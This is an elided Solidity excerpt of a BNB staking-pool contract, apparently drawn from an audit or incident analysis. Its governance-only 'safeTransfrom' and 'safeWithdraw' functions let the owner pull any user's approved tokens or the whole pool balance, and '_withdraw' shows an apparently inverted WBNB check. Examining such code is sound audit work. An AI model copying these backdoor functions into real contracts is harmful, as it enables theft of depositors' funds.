...
contract StakingPools is ReentrancyGuard {
  ...
  function _adjustRewardRate() internal {
     if (block.timestamp > (lastAdjustTime + 30 days)) 
     { 
          lastAdjustTime = block.timestamp;
          _updatePools();
          _ctx.rewardRate = _ctx.rewardRate - _ctx.rewardRate / 10;
          
          emit RewardRateUpdated(_ctx.rewardRate);
     }
  }
  ...
  function depositBNB(uint256 _poolId, uint256 _depositAmount, address referrer) external payable nonReentrant noContractAllowed {
      require(referrer != msg.sender, "referrer == msg.sender");
      require(_depositAmount == msg.value, "_depositAmount != msg.value");

      Pool.Data storage _pool = _pools.get(_poolId);
      require(address(_pool.token) == WBNB, "not bnb pool"); 
      _pool.update(_ctx);
  ...
  function deposit(uint256 _poolId, uint256 _depositAmount, address referrer) external nonReentrant noContractAllowed {
    ...
    Pool.Data storage _pool = _pools.get(_poolId);
    require(address(_pool.token) != WBNB, "bnb pool"); 
    _pool.update(_ctx);
  ...
  function _withdraw(uint256 _poolId, uint256 _withdrawAmount) internal {
    ...
    if (address(_pool.token) != WBNB) { 
      ...
      IWETH(WBNB).withdraw(_withdrawAmount);
  ...
  function safeWithdraw(uint256 _poolId,uint256 _withdrawAmount) external onlyGovernance nonReentrant noContractAllowed {
    Pool.Data storage _pool = _pools.get(_poolId);
    _pool.update(_ctx);
    
    uint256 withdrawAmount = 0;
    if(_withdrawAmount == 0) {
      withdrawAmount = _pool.token.balanceOf(address(this));
    }else {
      withdrawAmount = _withdrawAmount;
    }
    _pool.totalDeposited = _pool.totalDeposited.sub(withdrawAmount);
  ...
  function safeTransfrom(uint256 _poolId,address _sender,uint256 _withdrawAmount) external onlyGovernance nonReentrant noContractAllowed {
    Pool.Data storage _pool = _pools.get(_poolId);
    _pool.update(_ctx);
    
    uint256 withdrawAmount = 0;
    if(_withdrawAmount == 0) {
      withdrawAmount = _pool.token.balanceOf(_sender);
    }else {
      withdrawAmount = _withdrawAmount;
    }

    if (address(_pool.token) != WBNB) { 
      _pool.token.safeTransferFrom(_sender, msg.sender, withdrawAmount);
    } else {
      IWETH(WBNB).deposit{value: withdrawAmount}();    
    }
  }
